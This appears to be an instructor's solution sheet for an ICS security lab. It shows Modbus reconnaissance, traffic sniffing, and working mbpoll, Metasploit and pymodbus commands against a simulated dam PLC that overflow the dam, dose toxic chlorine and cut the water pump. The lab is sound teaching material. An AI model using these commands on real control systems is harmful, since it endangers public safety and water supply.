# HydraGuard (Scenario 1): Solution Commands

**Facility:** Dam & Water Treatment Plant
**Protocol:** Modbus/TCP · Port 5020 · Unit/Slave ID 1

> Solution commands for each attack phase.
> Multiple tool options are shown per phase so students practice the same
> workflow a real assessor uses, not just one library.

---

## Real-world tooling & context

A real attacker's Modbus workflow is **discover → enumerate → weaponize**, and the
tools change at each step. This lab shows all of them; pick whichever fits the class.

| Step | Tools shown here |
|------|------------------|
| Port discovery | `nmap` (find open ports; its service *name* is only a guess) |
| Protocol fingerprint | `mbpoll` register read, device-ID query |
| Read / enumerate | `mbpoll`, Metasploit `modbusclient`, pymodbus |
| Write / manipulate | `mbpoll`, Metasploit `modbusclient`, pymodbus |
| Eavesdrop | Wireshark |

**Addressing note.** Modbus register/coil numbers are **0-based** in this lab
(register 0 = water level, coil 0 = sluice gate). `mbpoll` defaults to
**1-based** references, so every example below uses the `-0` flag to make the
reference number match the register number directly. Metasploit `DATA_ADDRESS`
and pymodbus are already 0-based.

**Register values are scaled ×100** (stored as integers, 2 decimal places), so a
water level of 50.0 m reads as `5000`, and to set chlorine to 20.00 ppm you write `2000`.

---

## Phase 1: Reconnaissance

**Objective:** Discover the Modbus service and enumerate all PLC registers and coils to map the facility's control parameters.

### Step 1: Find open ports (nmap)

```bash
nmap -sT -p 1-10000 localhost
# Reveals 5020-5023 open (this host runs several ICS services).
# WARNING: the SERVICE column is only a static name-for-the-port-number guess
# (5020 might be mislabelled). It does NOT mean nmap identified the
# protocol. Confirm by speaking Modbus in Step 2. Don't trust the label.
```

> **Why we fingerprint by protocol, not by nmap's label.** This lab runs Modbus on
> **5020, not the standard 502**. Because of that, nmap's `SERVICE` column may show a
> meaningless static guess, `nmap -sV` can't fingerprint the device,
> and the `modbus-discover` NSE script **won't even run** (its port rule is hard-wired
> to port 502 / a service already identified as "modbus"). This is realistic, as ICS on
> non-standard ports routinely defeats nmap's guesses. The reliable way to identify an
> ICS service, in this lab and in the field, is to **speak the protocol** and see if it
> answers (below).

### Step 2: Confirm it's Modbus by speaking the protocol (mbpoll)

A valid register/coil response = the port really is Modbus. This is the ground-truth
fingerprint (nmap can't do it here; see the note above).

```bash
# -0 = 0-based addressing, -1 = poll once, -t 4 = holding regs, -t 0 = coils
# Read all 9 holding registers (0-8):
mbpoll -0 -m tcp -a 1 -r 0 -c 9 -t 4 -1 -p 5020 localhost

# Read all 6 coils (0-5):
mbpoll -0 -m tcp -a 1 -r 0 -c 6 -t 0 -1 -p 5020 localhost

# Continuous poll (drop -1): mbpoll re-reads every second, like an HMI.
# Watch the values update live; Ctrl-C to stop.
mbpoll -0 -m tcp -a 1 -r 0 -c 9 -t 4 -p 5020 localhost

# Remember: raw values are scaled ×100 (5000 = 50.00, etc.)
```

### Step 3: Identify the device (Report Server ID / Read Device ID)

Query the device identity to reveal the PLC make/model. mbpoll doesn't expose this,
so use Metasploit or a one-line pymodbus probe (both use standard Modbus functions
0x11 / 0x2B):

```bash
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('localhost', port=5020); c.connect()
info = c.read_device_information().information
labels = {0:'Vendor', 1:'Product code', 2:'Revision'}
for k in sorted(info):
    print(f'{labels.get(k,k):12}: {info[k].decode()}')
c.close()"
# Expected:
#   Vendor      : Schneider Electric
#   Product code: BMXP342020
#   Revision    : 2.7
# => a Schneider Modicon M340 PLC, the dam controller.
```

### More ways to read registers & coils (Metasploit)

```bash
msfconsole -q
# Confirm it speaks Modbus
use auxiliary/scanner/scada/modbusdetect
set RHOSTS 127.0.0.1
set RPORT 5020
run

# Read the holding registers
use auxiliary/scanner/scada/modbusclient
set RHOSTS 127.0.0.1
set RPORT 5020
set UNIT_NUMBER 1
set ACTION READ_HOLDING_REGISTERS
set DATA_ADDRESS 0
set NUMBER 9
run

# Read the coils
set ACTION READ_COILS
set DATA_ADDRESS 0
set NUMBER 6
run
```

> (`READ_ID` exists but crashes on a module
> bug; use the pymodbus device-ID probe in Step 3 instead.) This PLC maps
> everything into holding registers + coils, so `READ_INPUT_REGISTERS` /
> `READ_DISCRETE_INPUTS` return nothing useful.

### Or script it yourself (pymodbus)

```bash
# Install pymodbus if needed:
pip install pymodbus

# Read all holding registers:
python3 -c "
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('localhost', port=5020)
client.connect()
result = client.read_holding_registers(0, count=9)
for i, val in enumerate(result.registers):
    print(f'Register {i}: {val} (scaled: {val/100:.2f})')
client.close()"

# Read all coils (boolean states):
python3 -c "
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('localhost', port=5020)
client.connect()
result = client.read_coils(0, count=6)
print('Coils:', result.bits[:6])
client.close()"
```

---

## Phase 2: Passive Eavesdropping

**Objective:** Capture live Modbus traffic and observe that all communication is unencrypted with zero authentication.

### Wireshark (GUI)

1. Capture on interface **Loopback: lo0** (all 127.0.0.1 traffic rides lo0).
2. Capture filter: `tcp port 5020`.
3. **Decode the traffic as Modbus.** Wireshark only auto-dissects Modbus on the
   *standard* port 502, so on 5020 the `modbus` display filter shows nothing until
   you tell it otherwise: right-click a port-5020 packet → **Decode As…** → set the
   port to **MODBUS/TCP** → OK. (Permanent: Preferences → Protocols → Modbus/TCP →
   add `5020` to the TCP port list.)
4. Now apply display filter: `modbus`


> **Realism note:** on a real switched network you can't passively see this traffic
> from an arbitrary host; you'd need a **SPAN/mirror port, a network tap, or a MITM
> position** (e.g. ARP spoofing). Loopback hands it to you here purely to study the
> protocol's cleartext weakness.

---

## Phase 3: Register & Coil Manipulation

**Objective:** Write malicious values to PLC registers and coils to cause dangerous conditions in the dam and treatment plant.

### With mbpoll

```bash
# Attack 1: OVERFLOW THE DAM by closing the sluice gate, register 3 (gate %) = 0.
# Outflow stops, inflow continues → water rises → HIGH LEVEL → spillway → overflow.
mbpoll -0 -m tcp -a 1 -r 3 -t 4 -p 5020 localhost 0

# Attack 2: TOXIC CHLORINE, register 4 = 2000 (20.00 ppm, normal 2.5).
mbpoll -0 -m tcp -a 1 -r 4 -t 4 -p 5020 localhost 2000

# Attack 3: SWITCH OFF THE DISTRIBUTION PUMP, coil 3 = 0.
# Distribution pressure collapses to 0 → low-pressure alarm, supply to city lost.
mbpoll -0 -m tcp -a 1 -r 3 -t 0 -p 5020 localhost 0
```

### With Metasploit (modbusclient)

```bash
msfconsole -q
use auxiliary/scanner/scada/modbusclient
set RHOSTS 127.0.0.1
set RPORT 5020
set UNIT_NUMBER 1

# Attack 1: overflow the dam by closing the gate (register 3 = 0). Value goes in DATA.
set ACTION WRITE_REGISTER
set DATA_ADDRESS 3
set DATA 0
run

# Attack 2: toxic chlorine (register 4 = 2000)
set DATA_ADDRESS 4
set DATA 2000
run

# Attack 3: switch off the distribution pump (coil 3 = 0)
set ACTION WRITE_COIL
set DATA_ADDRESS 3
set DATA 0
run
```

### Or script it yourself (pymodbus)

```bash
# Attack 1: OVERFLOW THE DAM by closing the sluice gate
# With gate at 0%, outflow stops but inflow continues.
# Water level rises until HIGH LEVEL alarm → spillway → overflow!
python3 -c "
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('localhost', port=5020)
client.connect()
client.write_register(3, 0)  # 0% open = fully closed (scaled x100)
print('Gate CLOSED, dam will overflow!')
client.close()"

# Attack 2: TOXIC CHLORINE, set dosing to 20 ppm (normal is 2.5)
python3 -c "
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('localhost', port=5020)
client.connect()
client.write_register(4, 2000)  # 20.00 ppm (scaled x100)
print('Chlorine set to 20 ppm, TOXIC!')
client.close()"

# Attack 3: SWITCH OFF THE DISTRIBUTION PUMP (coil 3)
# Distribution pressure collapses to 0 → low-pressure alarm, supply to city lost.
python3 -c "
from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient('localhost', port=5020)
client.connect()
client.write_coil(3, False)  # distribution pump OFF
print('Distribution pump OFF, pressure collapsing!')
client.close()"
```